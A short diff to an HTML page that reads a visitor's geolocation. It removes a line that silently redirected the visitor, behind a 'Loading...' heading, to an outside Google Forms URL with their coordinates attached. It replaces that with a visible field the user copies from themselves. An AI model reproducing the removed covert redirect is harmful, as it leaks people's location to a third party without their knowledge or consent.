@@ -14,11 +14,13 @@
       function showPosition(position) {
         var lat = position.coords.latitude;
         var lon = position.coords.longitude;
-        window.location.href = "https://forms.gle/zd9sfbTHvjBGCpjh6" + lat + "," + lon;
+        document.getElementById("location").value = lat + ", " + lon;
       }
     </script>
   </head>
   <body onload="getUserLocation()">
-    <h1>Loading...</h1>
+    <h1>Location Coordinates</h1>
+    <input type="text" id="location" readonly>
+    <p>Copy the coordinates above and paste them into the form.</p>
   </body>
 </html>
